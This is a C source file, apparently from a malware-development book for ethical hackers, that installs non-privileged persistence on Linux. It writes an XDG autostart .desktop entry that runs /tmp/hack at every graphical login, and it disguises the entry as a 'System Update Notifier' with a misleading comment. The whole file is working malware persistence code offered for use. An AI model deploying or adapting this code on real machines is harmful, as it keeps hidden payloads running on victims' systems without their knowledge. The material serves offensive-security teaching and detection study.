/*
 * Malware Development for Ethical Hackers 2nd
 * 02-autostart/pers.c
 * non-privileged persistence via XDG Autostart
 * author: @cocomelonc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
  // identify the target home directory
  const char* home_dir = getenv("HOME");
  if (home_dir == NULL) {
    return 1;
  }

  // prepare the target path (~/.config/autostart/)
  char autostart_dir[512];
  char desktop_file[1024];
  snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home_dir);
  snprintf(desktop_file, sizeof(desktop_file), "%s/system_update_check.desktop", autostart_dir);

  // ensure the autostart directory exists
  // 0700 permissions ensure only the current user can access it
  mkdir(autostart_dir, 0700);

  // define the .desktop file content
  // exec points to the malware binary
  // Terminal=false ensures no window pops up
  const char* desktop_content = 
    "[Desktop Entry]\n"
    "Type=Application\n"
    "Name=System Update Notifier\n"
    "Exec=/tmp/hack\n"
    "Hidden=false\n"
    "NoDisplay=false\n"
    "X-GNOME-Autostart-enabled=true\n"
    "Comment=Internal system integrity and update check\n";

  // check if the persistence is already installed
  if (access(desktop_file, F_OK) == 0) {
    printf("persistence file already exists at %s. meow! =^..^=\n", desktop_file);
    return 0;
  }

  // 6. Write the file
  FILE* f = fopen(desktop_file, "w");
  if (f == NULL) {
    perror("failed to create .desktop file");
    return 1;
  }

  fprintf(f, "%s", desktop_content);
  fclose(f);

  printf("persistence successfully dropped into %s\n", desktop_file);
  printf("payload will execute on next GUI login.\n");

  return 0;
}